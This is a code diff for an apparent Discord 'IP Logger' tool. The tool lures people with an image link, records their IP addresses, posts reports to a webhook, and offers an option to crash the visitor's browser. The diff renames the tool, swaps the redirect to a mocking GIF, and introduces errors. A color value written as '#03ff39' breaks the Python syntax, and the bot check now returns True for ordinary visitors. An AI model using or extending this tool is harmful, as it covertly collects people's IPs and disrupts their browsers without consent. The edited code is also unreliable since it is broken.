@@ -16,8 +16,8 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "IP Logger", # Set this to the name you want the webhook to have
+    "color": #03ff39, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -49,7 +49,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://media1.tenor.com/m/BuXFFJzCD4QAAAAC/open-this-in-browser.gif" # Link to the webpage to redirect to 
+        "page": "https://media1.tenor.com/m/9MVlipGuNioAAAAC/you-are-an-idiot.gif" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -70,7 +70,7 @@ def botCheck(ip, useragent):
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
-        return False
+        return True
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -78,7 +78,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "IP Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
